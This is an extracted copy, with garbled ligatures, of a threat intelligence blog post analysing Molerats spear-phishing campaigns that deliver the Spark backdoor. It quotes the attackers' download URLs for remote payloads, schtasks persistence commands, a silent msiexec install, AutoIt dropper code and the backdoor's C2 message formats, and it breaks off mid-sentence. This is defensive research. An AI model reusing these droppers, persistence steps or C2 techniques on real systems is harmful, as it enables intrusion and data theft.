{
    "title": "Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations",
    "text": "01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 1 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/Molerats Delivers Spark Backdoor to Governmentand T elecommunica!ons Organiza!ons59,369people reacted4228 min. read This post is also available in: ೔ຊޠ( Japanese)Execu!ve SummaryBetween October 2019 through the beginning of December 2019, Unit 42 observed mul!ple instances ofphishing a\"acks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang)targe!ng eight organiza!ons in six diﬀerent countries in the government, telecommunica!ons, insurance and retailindustries, of which the la\"er two were quite peculiar. The targe!ng of insurance and retail organiza!ons ispeculiar as it does not ﬁt with this threat groups prior target set. The email subject and a\"achment ﬁle names usedin the a\"acks on these seemingly atypical targets were similar in theme as those used when a\"acking governmentorganiza!ons. The lack of industry or target speciﬁc social engineering themes likely lowers the chances of asuccessful compromise and further confuses our understanding of the purpose of a\"acking these organiza!ons.By Robert Falcone, Bryan Lee and Alex HinchliﬀeMarch 3, 2020 at 6:00 AMCategory: Malware, Unit 42Tags: Gaza Hacking Team, JhoneRAT, Macros, MoleRats, SparkSHARE  Under Attack?About Unit 42ServicesUnit 42 Threat ResearchPartnersResources01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 2 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/All of the a\"acks involved spear-phishing emails to deliver malicious documents that required the recipient tocarry out some ac!on. The social engineering techniques included lure images a\"emp!ng to trick the user intoenabling content to run a macro and even document contents that threaten to release compromising pictures tothe media to coerce the user into clicking a link to download a malicious payload. The payload in a majority ofthese a\"acks was a backdoor called Spark, which is a backdoor that allows the threat actors to open applica!onsand run command line commands on the compromised system.The Spark backdoor has been used by Molerats since at least 2017 and is associated with the Opera!onParliament campaign, which is a\"ributed to the Gaza Cybergang. The payload delivered in one of the a\"acksappears to be related to JhoneRAT, which may suggest the threat group has added another custom payload totheir toolset.Molerats has been in opera!on as far back as 2011 targe!ng government organiza!ons around the world, largelybeen associated with a\"acks involving unauthorized access and sensi!ve data collec!on.They have been observedusing a bevy of tac!cs and techniques, ranging from leveraging publicly available backdoor tools, such as PoisonIvyor XtremeRAT, to crea!ng custom developed ones such as KASPERAGENT and MICROPSIA. In the campaign thatwe tracked, this group primarily relied on social engineering and spear-phishing techniques for their ini!alinfec!on vector, then mul!-stage command-and-control (C2) servers for malware delivery.Molerats used a variety of techniques to make detec!on and analysis diﬃcult, such as password-protec!ngdelivery documents, limi!ng the execu!on of the Spark payload to only run on systems with an Arabic keyboardand locale and the use of the commercial packer Enigma to obfuscate the payloads. The Spark C2 channel alsoa\"empts to evade detec!on, as the data in the HTTP POST requests and responses is encrypted using either3DES or AES with randomly generated keys that appear to be unique for each payload.Star!ng PointIn November 2019, Unit 42 was made aware of a single phishing email directed at a Saudi Arabian governmentorganiza!on. This a\"ack involved a password-protected Microso% Word document, which contained anembedded macro. The password for the document was provided to the vic!m in the body of the email. From thear!facts discovered in this a\"ack, we were able to use our AutoFocus product to pivot to addi!onal a\"acks anduncover what turned out to be an a\"ack campaign by Molerats.Using our AutoFocus tool, we were able to ﬁnd several a\"acks sent from the actors star!ng on October 2 throughDecember 9, 2019. The emails were sent to organiza!ons in the government and telecommunica!ons ver!calsand had a mixture of speciﬁc and generic email subjects and a\"achment ﬁlenames. We also saw sessionsassociated with this a\"ack campaign involving two US-based organiza!ons, one in the retail and the other in theinsurance industry.The ﬁles a\"ached to these emails were all documents, with the majority being Word documents and one PDFdocument. Table 1 shows a list of the emails used in this a\"ack campaign, including the details of the email andthe country and industry of the targeted organiza!on. In this blog, we will provide an analysis of three of the sevendelivery documents listed in Table 1, as the four unique delivery documents with MOFA in their ﬁle names areextremely similar to each other. The last delivery document (‘Urgent.docx’) was the delivery document discussed inCisco Talos' research on a new payload called JhoneRAT, which may suggest that this group also uses JhoneRAT intheir a\"ack campaigns in the region.DateSubjectA!achmentSHA256CountryIndustry01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 3 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/10/2/2019MOFA reports 03-10-2019MOFA-031019.docd19104ef4f443e8..AEGov10/3/201903-10-2019MOFA-031019.docd19104ef4f443e8..UK,ESGov10/5/201906-10-2019MOFA-061019.doc03be1d7e1071b01..AEGov10/10/2019MOFA ReportsMOFA-101019.doc011ba7f9b4c508f..ddf938508618ﬀ7..USInsurance,Retail10/31/20192019-10-31 ا$رفق - معاليكم لعنايةa\"achment.doceaf2ba0d78c0fda..DJTelecom11/2/20192019-10-31 ا$رفق - معاليكم لعنايةa\"achment.doceaf2ba0d78c0fda..DJTelecom11/18/2019صورك<redacted>هبة معPictures.pdf9d6ce7c585609b8..ESGov11/24/2019وضرب اسرائيل $باغتة س@ميAا الجهاد مخططالتهدئةUrgent.docx273aa20c4857d98..DJTelecom12/9/2019حركة  وفد مع العامة ا$خابرات قيادة اجتماع محضر2019-12-09 حماسUrgent.docx273aa20c4857d98..DJTelecomTable 1. Details of spear-phishing emails seen in this a!ack campaignMOFA Delivery DocumentThe ﬁrst document we collected and analyzed had the ﬁlename MOFA- 061019.doc (SHA256:03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506). This document waspassword-protected with the password Abdullah@2019. When opening and supplying the password, the vic!mwas presented with contents that include what appears missing images, as seen in Figure 1.01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 4 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/ Figure 1. Lure image in MOFA delivery documentOnce the vic!m then enabled the embedded macro inside the document, the macro decodes an embeddedVBScript (T1064) and saves it to C:\\programdata\\Micorsoft\\Microsoft.vbs. The Microso%.vbs scriptwill reach out to the C2 domain servicebios[.]com to retrieve a second VBScript, which contained addi!onalinstruc!ons to then retrieve the payload. The script downloads this secondary VBScript from the following URLand saves it to C:\\ProgramData\\PlayerVLC.vbs:https://servicebios[.]com/PlayerVLC.vbsThe ini!al VBScript will then create a scheduled task (T1053) to persistently run the secondary VBScript everyminute by running the following command:schtasks /create /sc minute /mo 1 /tn PlayerVLC /F /tr C:\\ProgramData\\PlayerVLC.vbsThe secondary VBScript a\"empts to download the executable payload from the following URL and saves it toC:\\ProgramData\\PlayerVLC.msi.https://servicebios[.]com/PlayerVLC.msiA%er downloading the executable payload, the secondary VBScript runs the following command on the commandline (T1059) to kill any exis!ng msiexec.exe process instances and use the ping applica!on to sleep for twoseconds before using the legi!mate msiexec.exe applica!on (T1218) to launch the downloaded PlayerVLC.msifile:%comspec% /c taskkill /F /IM msiexec.exe & ping 127.0.0.1 -n 2 >NUL & msiexec /iC:\\ProgramData\\PlayerVLC.msi /quiet /qn /norestartUnfortunately, we were unable to obtain the PlayerVLC.msi file, as it was no longer hosted by the C2server. This highlights the beneﬁts of a modular payload that requires a chain of successful communica!ons with a01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 5 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/C2 server for a successful infec!on, as it makes post-intrusion analysis diﬃcult. This type of modular payload andchained C2 requests is fairly common, as we have seen it in use by various adversaries such as DarkHydrus andSofacy. This behavior can assist the adversary in evading automated defenses, as they can deploy theirinfrastructure at !me of a\"ack and avoid having addi!onal ar!facts available for further analysis.A\"achment Delivery DocumentThe Word document delivered on October 31 and November 2, 2019 (SHA256:eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000) had a ﬁlename ofa\"achment.doc and a\"empted to trick the recipient into clicking the “Enable Content” bu\"on to run an embeddedmacro. Figure 2 shows the lure image used in an a\"empt to trick the recipient into clicking the “Enable Content”bu\"on. These documents were not password-protected, unlike the MOFA delivery documents previouslydiscussed. Figure 2. Lure image in A!achment delivery documentThe macro is quite simple, as it a\"empts to download a base64 encoded executable from the following GoogleDrive URL that it will decode and save to %TEMP%\\rundll64.exe:hxxps://drive.google[.]com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepHThe decoded executable (SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P) is a compiled AutoItscript that installs an embedded executable to %userprofile%\\runawy.exe and runs it. Before exi!ng, theAutoIt script also makes sure the executable will persistently run by copying the executable to the startupdirectory and by crea!ng a scheduled task by running the following command:SCHTASKS /Create /f /SC minute /TN \"runawy\" /mo 5 /tr \"%userprofile%\\runawy.exe\"The runawy.exe ﬁle(SHA256:64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431) is a payload01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 6 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/packed with Enigma that creates a mutex of “S4.4P”. This payload is a packed variant of the Spark backdoor, whichhas been exclusively linked to Molerats. We will discuss the Spark backdoor’s func!onality in detail later in thisblog, but this speciﬁc sample has the following conﬁgura!on:{\"sIt\":\"nysura[.]com\",\"QrU\":\"/\",\"JJDF\":80,\"MJOu\":0,\"TuS\":\"\",\"pJhC\":1,\"Lm\":\"NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=\",\"LPO\":10000}Pictures PDF Delivery DocumentUnlike the prior two Word documents discussed, we observed a PDF document named “Pictures.pdf”(SHA256:9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495) a\"ached to anemail with a subject of صورك< redacted> هبة مع ,which roughly translates from Arabic to “Your ﬁlthy pictures withHeba”. The PDF document does not a\"empt to exploit a vulnerability, rather it contains a message meant tocoerce the recipient into clicking a link to install the actor’s payload. Also, unlike the Word delivery documents thatused ﬁnesse lure images and missing content in an a\"empt to trick the user into enabling macros, this PDFdocument uses a more brash approach that contained a blackmail-esque message in an a\"empt to trick the userinto clicking a link, opening a RAR archive and running an executable.The message within the PDF document is in Arabic and suggests the sender has compromising pictures of therecipient that they will release to the media. The message also suggests the document was sent to an associate ofa government oﬃcial and was meant to threaten the vic!m into clicking a link within the document. Figure 3shows the contents within the PDF document. Figure 3. Screenshot of the contents of the malicious PDF document01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 7 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/The link within the document is in Arabic and roughly translates to “A small sample of your filthypictures with Heba” and “Pictures”. The link points to the following URL, which is case sensi!ve:hxxps://zmartco[.]com/Pictures.rarThe \"Pictures.rar\" ﬁle (SHA256:1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da) is a RAR archive thatcontains one ﬁle with a ﬁlename of الصور من قليلة عينة هذه.exe (SHA256:92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7), which roughly translatesto \"This is a few sample photos.exe\". The executable is a compiled AutoIt script that extracts an embeddedexecutable, saves it to disk at C:\\Users\\Public\\pdf.exe (SHA256:5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3) and creates a shortcut inStart Menu\\Programs\\Startup\\pdf.lnk to automa!cally start it each !me the system starts, as seen here:Like the “runawy.exe” payload delivered by the a\"achment.doc Word document, the \"pdf.exe\" ﬁle saved to thesystem is a packed variant of the Spark backdoor. This variant of the backdoor had the following conﬁgura!on:{\"xBql\":\"laceibagrafica[.]com\",\"eauy\":\"/\",\"Qnd\":80,\"jJN\":0,\"rlOa\":\"\",\"Eb\":1,\"BGa\":\"vcJbq6nzgJk=\",\"qJk\":10000}Delivery InfrastructureO%en when inves!ga!ng a\"acks like these, links between infrastructure used across dis!nct campaigns can beeasily found, such as by tracking reused IP addresses or domains, ﬁnding related domains sharing similar a\"ributes,and so on. In the case of all the MOFA-related delivery documents listed in Table 1, servicebios[.]com wasthe only domain used, and most of the infrastructure informa!on related to historical usage.With the AutoFocus Threat Intelligence service, we used alterna!ve data points provided from our cloud sandbox,WildFire, during the analysis of said malicious documents in order to pivot and discover addi!onal samples andrelated infrastructure. In this sec!on we will discuss the methods we used and describe the addi!onalinfrastructure.Figure 4 below is a maltego chart showing the Word documents and Visual Basic Script (vbs) ﬁles related to theservicebios[.]com domain in the bo\"om half of the chart, with some of the related en!!es connected viaone of two links, to other en!!es in the top half of the chart. Said links include Yara signatures in the blue box andan AutoFocus query in the orange box, as indicated by the “AF” for AutoFocus. 123456#NoTrayIconFileInstall(\"pdf.exe\", \"C:\\Users\\Public\\\" & \"/pdf.exe\")$cmd1 = \"C:\\Users\\Public\\\" & \"\\pdf.exe\"RunWait(@ComSpec & \" /c start \" & $cmd1, \"\", @SW_HIDE)FileCreateShortcut(\"C:\\Users\\Public\\\" & \"\\pdf.exe\", @StartupDir & \"\\pdf.lnk\")01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 8 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/Figure 4. Chart showing rela\"onships between delivery documents and associated infrastructureThe AutoFocus query relates to a speciﬁc process execu!on chain leading to a Windows Scrip!ng Host process(wscript.exe) launching the malicious VBS downloader scripts. This allowed us to pivot on behavioural artefactsfrom the “MOFA- 101019.doc” (SHA256:ddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8) document to previouslyunknown documents “2019 - 9 - 9 - ليوم الفلسطينية ا$ستجدات أهم حول اليومي التقرير.doc” (Daily report on the mostimportant Pales!nian developments, 9-9-2019.doc; SHA256:feec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21) and “أخر حول اليومي التقرير2019 - 9 - 9 -العا$ي رهابbا مستجدات.doc” (Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc;SHA256: bf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959).As with the original Word document, the VBA macro code inside the new documents also used the open-sourcecode “Base64 decode VBS func!on” from Motobit to decode (T1027) the download func!on and URL to VBSbefore running it. The main diﬀerence between the VBS ﬁles is the domain - dapoerwedding[.]com - wherethe secondary VBS payload was hosted. At the !me of this ac!vity the domain resolved to 45.15.168[.]118and was used in a previous campaign from September 2019. 01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 9 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/In parallel to searching for related ﬁles using behavioural commonali!es, we authored Yara signatures for the VBScode associated with the original delivery document, to scan our and VirusTotal’s corpus. This led to two addi!onalVBS ﬁles: SHA256: 85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15represents the 1st stage VBS downloader containing minor changes to the domain and ﬁlename used, as follows:https://dapoerwedding[.]com/GoogleChrome.vbsThe second VBS ﬁle discovered (SHA256:9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7) is the 2nd stage VBSdownloader with reference to the ﬁnal MSI ﬁle payload, which was unavailable at the !me of wri!ng:https://dapoerwedding[.]com/GoogleChrome.msiWe were also able to discover addi!onal Word documents using other AutoFocus queries, as highlighted by thetwo other AutoFocus “AF'' orange boxes in Figure X above. These maltego en!!es query our data usingproprietary hashes calculated from the original document’s VBA macro code, and resulted in SHA256:602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb(servicebios[.]com), and SHA256s:a2c68da1b3e0115f5804a55768b2baf50faea81f13a16e563411754dc6c0a8ff and4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba(dapoerwedding[.]com).Upon ini!al inspec!on of dapoerwedding[.]com and servicebios[.]com, nothing stood out as having !esto previously documented Molerats ac!vity, however there were some commonali!es (T1347) between the twodomains:1. Pre-exis!ng domains2. Seemingly legi!mate historical content3. Recently expired (and lapsed domain redemp!on grace period)4. Post-expiry registrant (T1328) is NameCheap, Inc.5. Domain Valida!on (DV) SSL Cer!ﬁcates setup (T1337), issued by Sec!goAnother delivery domain - zmartco[.]com - that shares the same commonali!es listed above pertains to the“Pictures.pdf” delivery a\"achment listed in Table 1 discussed in the previous sec!on.Spark Payload Related to Opera!on ParliamentThe executables installed by the compiled AutoIt scripts is a backdoor that Molerats has used in many a\"ackcampaigns. Un!l recently, this backdoor did not have its own moniker, but Cybereason recently gave this backdoora name of “Spark”. As men!oned in Cybereason’s blog, the Spark backdoor was also delivered in a\"acks occurringin January 2019, as discussed in a blog published by Qihoo 360. Based on our research, the Spark backdoor hasbeen used by Molerats since at least early 2017, as it was the main payload in the Opera!on Parliament campaignreported by Kaspersky.Spark uses HTTP POST requests to communicate with its C2 server to receive commands and to exﬁltrate theresults, all of which using JSON-structured messages. In most cases, the threat actors use commercial packers toobfuscate the Spark payload to avoid detec!on. During our research, we have seen the actors use the Enigma01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 10 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/protector, Themida and VMProtect, which makes iden!fying samples diﬃcult. We were also able to iden!fy twodiﬀerent versions of Spark-based iden!ﬁers le% in the binaries by the developer, which are version 2.2 and 4.2.Based on the compila!on !mes of the ﬁles with the Spark samples with iden!ﬁable version strings, it appears thatversion 2.2 was created in 2017, while version 4.2 was created in late December 2019 and January 2020. Table 2shows these Spark samples that contained version numbers, along with their compile !me and the packer used toobfuscate their contents.Truncated SHA256VersionCompiledPacker966ad6452793b15..2.22017-05-24 6:15:04VMProtectab4e43b4e526d44..2.22017-05-24 6:15:04VMProtect212aa6e3f236550..2.22017-05-24 6:15:04VMProtectcf32479ed30ae95..4.22019-12-30 9:45:44noned0dc1de0ae912c7..4.22020-01-12 10:57:50Enigma04fa6aaea5e3a26..4.22020-01-12 10:57:50Enigma6e60f5c65299ee7..4.22020-01-12 10:57:50Enigmab08b8fddb9dd940..4.22020-01-12 10:57:50Enigma64ea1f1e0352f3d..4.22020-01-12 10:57:50EnigmaTable 2. Spark samples with their version number, compile \"me and the packer usedWe have collected dozens of Spark payloads, whose compile !mes range from March 2017 to January 2020,which further suggests this group has been using this backdoor in a\"ack campaigns for almost three years. Weextracted the conﬁgura!ons from each of these ﬁles to gather the known C2 domains associated with Spark,which we have included in Table 3.DomainFirst usedwebtutorialz[.]com1st Half 2020nysura[.]com1st Half 2020laceibagraﬁca[.]com2nd Half 2019motoqu[.]com2nd Half 2019smartweb9[.]com1st Half 2019laptower[.]com2nd Half 2018app.msexchanges16[.]com2nd Half 2018msexchange13[.]com2nd Half 2018cloudserviceapi[.]online2nd Half 2018updates.masterservices[.]online2nd Half 201801/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 11 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/clients.itresolver[.]online1st Half 2018update.itresolver[.]online1st Half 201891.219.237[.]992nd Half 2017goldenlines[.]site2nd Half 2017update.nextdata[.]site2nd Half 2017Table 3. Spark C2 domains and the approximate \"me they were usedIn the next sec!on, we will explain Spark’s capabili!es and demonstrate its C2 channel that we determined fromour analysis of the “pdf.exe” payload delivered by the Pictures.pdf document in the November 2019 a\"ack.Spark Payload in Pictures.pdf November 2019A\"ackThe Spark payload installed by the compiled AutoIt script is packed with the commercial Enigma protector(T1045). When packing the payload, the actor used a feature within Enigma protector called “Splash Screen”,which the actor conﬁgured to display an image on top of all the windows and waits for the user to click the imagebefore execu!ng the malicious code. Figure 5 shows the splash image displayed by the Enigma protector prior toexecu!ng the malicious payload, which is a wallpaper image available at wallpaperswide.com. The splash screenfeature acts as a sandbox evasion technique, as it requires user interac!on in the form of clicking the screenbefore the malicious code runs. Figure 5. Screenshot of the contents of the malicious PDF document01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 12 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/Once unpacked, we found the Spark payload was similar to the payloads delivered in Opera!on Parliament from acapability perspec!ve. The Spark payload is a backdoor that allows the threat actors to open applica!ons and runcommand line commands on the compromised system.The payload starts by checking the results of the GetKeyboardLayoutList and the language name returned byGetLocaleInfoA to make sure they contain the word \"arabic\". If the word is not found in the results of these twoAPI calls, the payload does not execute any of its malicious code. Checking for speciﬁc keyboards and languages isa known evasion tac!c meant to avoid running on analysis systems not conﬁgured, as the actor’s targeted vic!mwould be conﬁgured.A%er the payload conﬁrms that the system has the appropriate keyboard and language pack installed for theactor’s desired target, it will begin a\"emp!ng to communicate with a C2 server speciﬁed within a conﬁgura!onembedded within the payload. The embedded conﬁgura!on is encrypted and the payload decrypts it by ﬁrst usinga custom rolling XOR algorithm to decrypt a key and a buﬀer of ciphertext, resul!ng in a key and ciphertext thatappears encoded with base64. It will then generate the SHA256 hash of the base64 encoded key and use thefourth through the 28th bytes of the resul!ng hash as the ﬁnal key. The payload will base64 decode the ciphertextand use the ﬁnal key to decrypt the decoded ciphertext using Triple DES (3DES), which results in a conﬁgura!onthat is structured in JSON. This par!cular payload had the keys and values seen in Table 3 below.JSONFieldJSON ValueDescrip\"onxBqllaceibagraﬁca[.]comHostname of C2 servereauy/URI of C2 serverQnd80TCP port for C2 serverjJN0Sleep interval before entering the main C2 communica!ons loop.rlOa<empty string>Unknown and does not appear to be used.Eb1Unknown purpose, but sent to the C2 in the BrandentlK ﬁeldBGavcJbq6nzgJk=Hardcoded base64 encrypted string, which is the “Nickname” ﬁeld likely used as a campaigniden!ﬁerqJk10000Number of itera!ons of the main C2 communica!ons loop before exi!ng the applica!on.Table 3. JSON key/value pairs within the payload’s conﬁgura\"onThe payload also uses this same rou!ne to decrypt an encrypted buﬀer that contains sleep intervals and moreimportantly a list of ﬁrst names used to structure the messages sent to and from the C2 server, as well as the keysused to decrypt these messages. The payload will use the ﬁrst names listed in Table 4 as JSON key names andvalues within messages sent to and received from the C2. We provide a descrip!on of each element of thisdecrypted buﬀer in the Appendix, but also show how the names in Table 4 are used within the C2communica!ons later in this blog. Each of the values in Table 4 are unique per Spark sample, as the developerchanges the names and the keys for each payload.LawrenceAlanihNevaehGarrisonReeceWNMAllierAveriztLondonzOZekeMorganE01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 13 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/JaseNMathiasNboJoslynKeReesefPWinstonIvoryBrandentlKAngelxEvFrederickTJessicayJonasAdalynngSZaydenlnLKaileeXwsVanessaFMReginacyAdelineRDHoustonodEverlyYJordanlzwTrumanRdCollinsPMMaximilianoCallieVKAryanaTable 4. First names used by Spark as JSON key/value pairs used for C2 communica\"onsBefore communica!ng with the C2 server, the payload will decrypt one more buﬀer that contains strings that thepayload uses for debugging messages, as well as the commands it will use to gather system informa!on. Table 5shows the strings decrypted and their purpose.Decrypted StringDescrip\"on1Unknown purpose, but sent to the C2 in the Averizt ﬁeld311OEVZihfReZStoFf4cfg==Decodes and decrypts to /c hostname used to obtain thehostname of the systemZ9Q1WVryAIzLVSxF1yWRwg==Decodes and decrypts to %COMSPEC% to get the loca!on ofcmd.exe to run commands to gather system informa!onP5K5He/2wSGGsvrFPKYpwg4KjBLyTOpbsGJwm1DckoyGK8eXeNMZCQBfHzkYRSjJlGcw6Ckn41X0MY3zJcU65uMvxpABv/g+\"ABRJsG7js=Decodes and decrypts to /c wmic csproduct get UUID |more +1 | cmd /q /v:on /c \"set/p .=&echo(!.!\"used to obtain the UUID of the systemAykC+x26hhd5DfrB/yly9gXcFsIlVxO9Decodes and decrypts to /c echo %username% used to obtainthe username of the logged in accountokGeneric message to indicate a successful execu!on of a commandCreate Pipe ErrorDebug message sent to the C2 if the payload fails to create a pipeto get the results of a commandCreate processa errorDebug message sent to the C2 if the payload fails when crea!ngthe process for a commandGet exit code process errorDebug message sent to the C2 if the payload fails when callingGetExitCodeProcess to get the error message when a\"emp!ng tocreate the process for a command0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+Unknown, as it does not appear to be used in the codeSet handle informa!on errorDebug message sent to the C2 if the payload fails when callingSetHandleInforma!on when a\"emp!ng to set the stdout ofcreated process to inherit the object handleWait for single object errorDebug message sent to the C2 if the payload fails when callingWaitForSingleObject a%er a\"emp!ng to create the process for acommand01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 14 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/Table 5. JSON key/value pairs within a buﬀer that the payload uses to communicate with C2 serverSpark C2 Communica!onsThe payload communicates with its C2 server laceibagrafica[.]com by issuing HTTP POST requests withbase64 encoded and encrypted messages in the data sec!on. We had not seen any previous explana!on of thisC2 channel, so we will provide an overview of the back and forth communica!ons between the payload and C2server to show how this payload uses the names in Table 4. To do this analysis, we created a C2 server to interactwith the Spark payload to issue commands, so all of the HTTP responses in this sec!on are from the C2 server wecreated and not an actor developed C2 so%ware. Figure 6 shows an ini!al beacon sent from the payload to its C2server. However, all of the outbound requests from the payload to the C2 will look similar visually, as they all useHTTP POST requests to the same URL with encoded and encrypted messages. Figure 6.Ini\"al beacon sent from payload to C2 serverThe data sec!on in the ini!al beacon decodes and decrypts to the JSON message{\"CallieVK\":\"W10=\",\"ReeceWNM\":\"Jessicay\"}. The JSON message involves two key/value pairs withkeys “ReeceWNM” and “CallieVK”, whose values transmit the communica!on type and the data, respec&ully. Forinstance, the “ReeceWNM” key includes the name “Jessicay” that is used to represent the ini!al beaconcommunica!on type. The payload will decrypt the C2 servers’ response looking for a “EverlyY” ﬁeld and usesthe value for a sleep interval before con!nuing. Figure 7 shows a response from the C2 server to the ini!albeacon, of which the response decrypts to {\"EverlyY\": 0}. Figure 7. Ini\"al beacon sent from payload to C2 serverA%er receiving the EverlyY response, the payload will gather system informa!on, speciﬁcally the username,hostname and the system speciﬁc UUID by running the following command line commands using ‘cmd.exe’:01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 15 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/1. wmic csproduct get UUID | more +1 | cmd /q /v:on /c \"set/p .=&echo(!.!\"2. hostname3. echo %username%The payload will store each of these command results in JSON in base64 encoded ciphertext within a ﬁeld name“ZaydenlnL” and using the ﬁrst name “AngelxEv” to represent the type of data, which is a number that correspondsto the results in the list above with 1 represen!ng the UUID, 2 the hostname and 3 the username. These threeJSON objects are added to a JSON array with a name of “Maximiliano” and sent to the C2 server. For example, thepayload stores the system informa!on in JSON as follows:{\"Maximiliano\":[{\"AngelxEv\":1,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertextof UUID>\"},{\"AngelxEv\":3,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext ofusername>\"},{\"AngelxEv\":2,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext ofhostname>\"}]}The payload will create an outbound communica!ons JSON object by se'ng the encoded system informa!onJSON to the “CallieVK” value and se'ng the “ReeceWNM” value to the communica!on type “JoslynKe”. Theresul!ng JSON will resemble the following:{\"CallieVK\":\"<base64 encoded ciphertext of system information “Maximiliano” JSONarray>\",\"ReeceWNM\":\"JoslynKe\"}The resul!ng JSON object is base64 encoded, encrypted and sent within the HTTP POST data to the C2 server, asseen in the example request in Figure 8. Figure 8. System informa\"on sent from payload to C2 serverA%er sending the system informa!on, the payload will expect to receive a command from the C2 server within theresponse. Figure 9 shows the response to this request that contains encrypted data that the payload will parse forcommands to execute.01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 16 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/ Figure 9. C2 server response containing ciphertext containing a command line command to executeThe payload does not have a command handler. Rather, it will process the JSON object within the C2’s responsefor applica!ons to open and/or command line commands to run by calling the CreateProcessW API func!on. Theexpected JSON object contains an array named “Jordanlzw” that has one or more objects that will have a taskiden!ﬁer number in a ﬁeld “Ivory”, an applica!on name to run in a “Alanih” ﬁeld, and the command line argumentsto pass to the applica!on in a “TrumanRd” ﬁeld. For instance, the decrypted response in Figure 9 contains a JSONobject would instruct the payload to run “c:\\windows\\system32\\cmd.exe” using the command line argument “/cwhoami”, which eﬀec!vely runs the “whoami” command:{\"Aryana\": 0, \"Jordanlzw\" :[{\"Ivory\" : 5, \"Jonas\" : true, \"Reginacy\" : false,\"TrumanRd\" : \"/NKg0zJdCDP1XlK9NJ4eJA==\", \"Alanih\" :\"i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=\", \"LondonzO\" : true}]}A%er running the command provided by the C2, the payload will send a message to the C2 server that we believeis meant to no!fy the C2 that it received the command by sending the speciﬁc task iden!ﬁer to the server. Thepayload will no!fy the C2 using the communica!on type \"MorganE\" as seen in the following JSON:{\"CallieVK\":\"eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=\",\"ReeceWNM\":\"MorganE\"}The decoded data within the “CallieVK” ﬁeld will contain a JSON array with a name of “JaseN” that contains one ormore objects with a ﬁeld name of “Lawrence” that contains the task numbers received, such as {\"JaseN\":[{\"Lawrence\":5}]}. This acknowledgement is sent to the C2 server, as seen in Figure 10: Figure 10. Payload no\"fying the C2 server that it received the commandA%er acknowledging the receipt of command, the payload expects the C2 to respond with a JSON object with the“Allier” ﬁeld set to a number, such as {\"Allier\" : 7}. We are unsure of the purpose of this transmission or how01/04/24, 21:21Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations Pagina 17 di 32https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/the payload uses this number value, but Figure 11 shows the base64 encoded ciphertext containing 